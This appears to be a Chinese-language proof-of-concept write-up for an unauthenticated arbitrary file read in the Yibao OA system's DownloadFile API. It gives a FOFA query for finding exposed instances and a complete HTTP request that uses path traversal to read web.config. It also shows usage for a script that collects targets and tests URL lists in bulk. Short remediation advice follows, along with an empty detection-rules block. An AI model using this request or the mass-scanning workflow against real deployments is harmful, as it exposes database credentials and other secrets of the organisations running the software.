### 产品简介  
易宝OA系统是一种专门为企业和机构的日常办公工作提供服务的综合性软件平台，具有信息管理、 流程管理 、知识管理（档案和业务管理）、协同办公等多种功能。  

### 漏洞概述  
DownloadFile接口处存在任意文件读取漏洞，未授权的攻击者可以利用此漏洞读取系统内部敏感配置文件，数据库密钥凭证等，使系统处于极不安全的状态。  

### 指纹识别  
fofa: app="顶讯科技-易宝OA系统" 或 body="topvision_oaName"  

![Image text](https://github.com/YUUKI4O4/POC/blob/main/%E6%98%93%E5%AE%9D/yibaoOA_DownloadFile_readFile/1.png)

### 漏洞利用  
```
poc:
POST /api/files/DownloadFile HTTP/1.1
Host: xxxxxxx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 93

token=zxh&requestFileName=../../manager/web.config&pathType=1&startPosition=0&bufferSize=1000
```

![Image text](https://github.com/YUUKI4O4/POC/blob/main/%E6%98%93%E5%AE%9D/yibaoOA_DownloadFile_readFile/2.png)

### 测试和利用脚本  
```
python3 yibaoOA_DownloadFile_readFile.py -h
usage: yibaoOA_DownloadFile_readFile.py [-h] [-t] [-r FILE] [-u URL]

### Yi Bao OA downloadfile interface has an arbitrary file reading vulnerability. ###

options:
  -h, --help            show this help message and exit
  -t, --target_collection
                        Perform target collection
  -r FILE, --multi_objective_testing FILE
                        Perform multi-objective testing. e.g:python yibaoOA_DownloadFile_readFile.py -r ./url.txt
  -u URL, --single_objective_testing URL
                        Perform single-objective testing. e.g:python yibaoOA_DownloadFile_readFile.py -u http://xxx.xxx.xxx
```

### 修复建议  
1、请联系厂商进行修复。  
2、如非必要，禁止公网访问该系统。  
3、设置白名单访问。  

### Suricata rules  
```

```
